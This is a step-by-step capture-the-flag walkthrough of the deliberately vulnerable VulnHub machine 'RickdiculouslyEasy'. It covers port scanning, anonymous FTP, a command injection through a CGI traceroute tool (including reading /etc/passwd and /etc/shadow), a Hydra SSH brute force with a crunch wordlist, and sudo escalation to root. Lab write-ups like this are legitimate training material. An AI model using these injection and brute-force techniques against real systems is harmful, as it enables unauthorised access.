[Download Link](https://download.vulnhub.com/rickdiculouslyeasy/RickdiculouslyEasy.zip)

(There are 130 points)

Finding IP address:
```
sudo arp-scan -l
```

Nmap scan:
```
nmap -sV -O -T4 --min-rate=10000 $ip
```
output
```zsh
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh?
80/tcp   open  http    Apache httpd 2.4.27 ((Fedora))
9090/tcp open  http    Cockpit web service 161 or earlier
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
```

Port scan:
```
nmap -sC -sV -Pn -p21,22,80,9090 $ip
```
output
```zsh
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
22/tcp   open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   NULL: 
|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
80/tcp   open  http    Apache httpd 2.4.27 ((Fedora))
|_http-server-header: Apache/2.4.27 (Fedora)
|_http-title: Morty's Website
9090/tcp open  http    Cockpit web service 161 or earlier
|_http-title: Did not follow redirect to https://10.170.71.213:9090/
```
Saw `flag.txt` in FTP, also anonymous login allowed 
Also doing an all ports scan:
```
nmap -sV -O -T4 -p- --min-rate=10000 $ip
```
output:
```zsh
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh?
80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
9090/tcp  open  http    Cockpit web service 161 or earlier
13337/tcp open  unknown
22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
60000/tcp open  unknown
```
Login with FTP:
```
ftp $ip
```
Username: `anonymous`
Password: `anonymous`
output
```zsh
ftp> ls
229 Entering Extended Passive Mode (|||11736|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
226 Directory send OK.
ftp> get FLAG.txt
local: FLAG.txt remote: FLAG.txt
229 Entering Extended Passive Mode (|||17164|)
150 Opening BINARY mode data connection for FLAG.txt (42 bytes).
100% |***************************************************************************************************************************************************************************************|    42        7.44 KiB/s    00:00 ETA
226 Transfer complete.
42 bytes received in 00:00 (7.11 KiB/s)
ftp> exit
221 Goodbye.
```

Read the `FLAG.txt`
`FLAG{Whoa this is unexpected} - 10 Points`=10/130

Next port 9090
Went to website `$ip:9090`
Got another flag
`FLAG {There is no Zeus, in your face!} - 10 Points`=20/130

Scanning the remaining ports:
```
nmap -sC -sV -Pn -p13337,60000 $ip
```
output
```zsh
PORT      STATE SERVICE VERSION
13337/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
60000/tcp open  unknown
|_drda-info: ERROR
| fingerprint-strings: 
|   NULL, ibm-db2: 
|_    Welcome to Ricks half baked reverse shell...
```

Got a flag from `13337`
`FLAG:{TheyFoundMyBackDoorMorty}-10Points` = 30/130

Went to HTTP 
Check the source code - nothing important there
Run Gobuster
```
gobuster dir -u http://$ip -w /usr/share/dirb/wordlists/common.txt -t 300 -x txt,php,html -q
```
output
```
/.htpasswd.html       (Status: 403) [Size: 223]
/.htaccess.html       (Status: 403) [Size: 223]
/.htaccess.txt        (Status: 403) [Size: 222]
/.htaccess.php        (Status: 403) [Size: 222]
/.hta.php             (Status: 403) [Size: 217]
/.htpasswd.php        (Status: 403) [Size: 222]
/.htpasswd.txt        (Status: 403) [Size: 222]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/cgi-bin/.html        (Status: 403) [Size: 222]
/cgi-bin/             (Status: 403) [Size: 217]
/index.html           (Status: 200) [Size: 326]
/index.html           (Status: 200) [Size: 326]
/.hta                 (Status: 403) [Size: 213]
/passwords            (Status: 301) [Size: 239] 
/robots.txt           (Status: 200) [Size: 126]
/robots.txt           (Status: 200) [Size: 126]
/.hta.html            (Status: 403) [Size: 218]
/.hta.txt             (Status: 403) [Size: 217]

```
Went to `/passwords` and got a flag from there
`FLAG{Yeah d- just don't do it.} - 10 Points`=40/130
Got a password: winter
from `/passwords.html`

Went to `robots.txt`
```
/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
```

Went to `/cgi-bin/root_shell.cgi` - nothing important
Went to `/cgi-bin/tracertool.cgi` - saw a tracer machine
Check source code for blocking parameters like ";" "&&" "|"
Confirmed it blocks nothing 
did 
```
1.1.1.1; whoami
```
Got as `apache`, so Command Injection works
tried
```
uname -a
```
output
```apache
Linux localhost.localdomain 4.11.8-300.fc26.x86_64 #1 SMP Thu Jun 29 20:09:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```
Check the pwd
`/var/www/cgi-bin`
Tried previous escalation through `shell.cgi` - didn't work

It's possible to read the `/etc/passwd`
```
1.1.1.1; less /etc/shadow
```
output:
```apache
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
```
The password "winter" must be the password of Summer

```
ssh Summer@$ip -p 22222
```
Login success
```ssh
[Summer@localhost ~]$ ls
FLAG.txt
[Summer@localhost ~]$ tail FLAG.txt 
FLAG{Get off the high road Summer!} - 10 Points
```
Got flag `FLAG{Get off the high road Summer!} - 10 Points`=50/130
Tried `cd ../Morty`
It works so download the home directory of the machine
 ```
 scp -p 22222 -r Summer@$ip:/home /home/aswil/Trash
 ```
Went to Morty's directory 
Got 2 files 
A password-protected zip and an image
Just read the image and got the password
`Meeseek`
Unzip the file and read the txt
```
unzip journal.txt.zip && cat journal.txt
```
Got the flag
`FLAG: {131333} - 20 Points`=70/130

Went to Rick directory
Saw a safe at `/RickSanchez/RICKS_SAFE`
Just run it
```
./safe
```
Got output as 
`Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!`
So need to use arguments
Trying the last flag
Used the last flag
```
./safe 131333
```
output
```zsh
decrypt: 	FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.
```
got the flag
`FLAG{And Awwwaaaaayyyy we Go!} - 20 Points`=90/130
Also got the password hint

Got his band name as:
`The Flesh Curtains` in the episode `Big Trouble in Little Sanchez`

Used `crunch` to make a custom wordlist
```
crunch 5 5 -t ,%The > rick_wordlist.txt
crunch 7 7 -t ,%Flesh >> rick_wordlist.txt
crunch 10 10 -t ,%Curtains >> rick_wordlist.txt
```

Used Hydra to brute-force the SSH of `RickSanchez`
```
hydra -l RickSanchez -P rick_wordlist.txt $ip ssh -f -W 5 -t 64 -s 22222
```
output
```
[DATA] max 10 tasks per 1 server, overall 10 tasks, 780 login tries (l:1/p:780), ~78 tries per task
[DATA] attacking ssh://10.170.71.213:22222/
[22222][ssh] host: 10.170.71.213   login: RickSanchez   password: P7Curtains
[STATUS] attack finished for 10.170.71.213 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

Login as RickSanchez 
```
ssh RickSanchez@$ip -p 22222
```
Checked sudo permissions
```
sudo -l
```
output
```bash
Matching Defaults entries for RickSanchez on localhost:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User RickSanchez may run the following commands on localhost:
    (ALL) ALL

```

**`(ALL) ALL`**
This means user `RickSanchez` is allowed to run **any command** as root using `sudo` without any restrictions.
Immediately went 
```
sudo su
```
Access Granted ROOT
```
cd /root
head FLAG.txt
```
`FLAG: {Ionic Defibrillator} - 30 points`=120/130

Connect to the remaining port `60000`
```
nc $ip 60000
```
And got the flag
```bash
Welcome to Ricks half baked reverse shell...
# ls
FLAG.txt 
# cat FLAG.txt
FLAG{Flip the pickle Morty!} - 10 Points 

```
Got the final flag
 `FLAG{Flip the pickle Morty!} - 10 Points`=130/130
 
